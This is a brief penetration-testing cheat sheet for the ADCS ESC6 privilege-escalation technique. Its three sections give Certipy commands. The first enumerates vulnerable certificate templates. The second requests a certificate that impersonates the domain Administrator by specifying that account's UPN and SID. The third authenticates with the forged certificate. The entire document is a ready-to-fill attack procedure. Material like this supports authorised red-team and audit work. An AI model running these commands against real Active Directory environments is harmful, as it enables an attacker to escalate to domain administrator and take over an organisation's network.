# ADCS ESC6

% adcs, certificate, ActiveDirectory, template

## 1. Finding vulnerable template
```
certipy find -u <username> -p '<password>' -target <CA_FQDN> -vulnerable -stdout
```
## 2. Request a cert that impersonates Administrator
```
certipy req -u <username> -p '<password>' -target <CA_FQDN> -ca <CA_NAME> -dc-ip <DC_IP> -dc-host <DC_HOST> -template <ESC6_TEMPLATE> -upn '<ADMIN_USER>@<DOMAIN>' -sid <ADMIN_SID>
```

## 3. Authenticate
```
certipy auth -pfx <ADMIN_USER>.pfx -dc-ip <DC_IP>
```
